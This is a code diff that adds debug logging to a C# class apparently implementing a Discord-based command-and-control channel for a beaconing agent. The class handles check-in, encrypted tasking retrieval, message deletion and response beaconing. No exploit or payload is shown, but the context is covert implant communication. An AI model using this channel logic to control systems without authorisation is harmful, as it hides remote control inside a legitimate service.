@@ -52,6 +52,7 @@ namespace Workflow.Channels
             _client = new DiscordSocketClient(gateway_config);
             _client.MessageReceived += _client_MessageReceived;
             _client.Ready += _client_Ready;
+            DebugLog.Log("Discord config loaded");
         }
 
         private async Task _client_Ready()
@@ -60,8 +61,10 @@ namespace Workflow.Channels
 
             if (_channel is null)
             {
+                DebugLog.Log("Discord channel not found, exiting");
                 Environment.Exit(0);
             }
+            DebugLog.Log("Discord channel found, client ready");
             clientReady.Set();
         }
 
@@ -72,6 +75,7 @@ namespace Workflow.Channels
                 return;
             }
 
+            DebugLog.Log("Discord message received");
 
             MessageWrapper discordMessage;
             if (message.Attachments.Count > 0 && message.Attachments.FirstOrDefault().Filename.Contains(_uuid))
@@ -85,6 +89,7 @@ namespace Workflow.Channels
 
             if (discordMessage is not null & !discordMessage.to_server && discordMessage.client_id == _uuid) //It belongs to us
             {
+                DebugLog.Log("Discord message belongs to us");
                 try
                 {
                     _ = message.DeleteAsync();
@@ -93,11 +98,13 @@ namespace Workflow.Channels
 
                 if (!checkedin)
                 {
+                    DebugLog.Log("Discord received checkin response");
                     cir = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), CheckinResponseJsonContext.Default.CheckinResponse);
                     checkinAvailable.Set();
                     return;
                 }
 
+                DebugLog.Log("Discord received tasking response");
                 //If we make it to here, it's a tasking response
                 GetTaskingResponse gtr = System.Text.Json.JsonSerializer.Deserialize(this.crypt.Decrypt(discordMessage.message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                 if (gtr == null)
@@ -122,7 +129,7 @@ namespace Workflow.Channels
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
-
+            DebugLog.Log("Discord sending checkin");
             await this.Send(System.Text.Json.JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             //Wait for a checkin response message
@@ -130,6 +137,7 @@ namespace Workflow.Channels
 
             //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
+            DebugLog.Log("Discord checkin response received");
 
             return this.cir;
         }
@@ -140,8 +148,10 @@ namespace Workflow.Channels
             this.cancellationTokenSource = new CancellationTokenSource();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
+                DebugLog.Log("Discord beacon iteration starting");
                 if (_client.LoginState != LoginState.LoggedIn)
                 {
+                    DebugLog.Log("Discord client not logged in, reconnecting");
                     await this.Start();
                 }
 
@@ -153,21 +163,25 @@ namespace Workflow.Channels
 
                 try
                 {
+                    DebugLog.Log("Discord beacon sending responses");
                     await this.Send(messageManager.GetAgentResponseString());
                 }
                 catch (Exception e)
                 {
                     this.currentAttempt++;
+                    DebugLog.Log($"Discord beacon send failed, attempt {this.currentAttempt}/{this.maxAttempts}");
                 }
 
                 if (this.currentAttempt >= this.maxAttempts)
                 {
+                    DebugLog.Log("Discord beacon max attempts reached, cancelling");
                     this.cancellationTokenSource.Cancel();
                 }
             }
         }
         internal async Task<string> Send(string json)
         {
+            DebugLog.Log($"Discord Send ({json.Length} bytes)");
             if (_client.LoginState != LoginState.LoggedIn)
             {
                 await this.Start();
@@ -189,6 +203,7 @@ namespace Workflow.Channels
 
             if (json.Length > 1950)
             {
+                DebugLog.Log("Discord sending as file attachment (message too large)");
                 using (MemoryStream stream = new MemoryStream(System.Text.Encoding.ASCII.GetBytes(System.Text.Json.JsonSerializer.Serialize(discordMessage))))
                 {
                     try
@@ -200,6 +215,7 @@ namespace Workflow.Channels
             }
             else
             {
+                DebugLog.Log("Discord sending as text message");
                 try
                 {
                     await _channel.SendMessageAsync(System.Text.Json.JsonSerializer.Serialize(discordMessage));
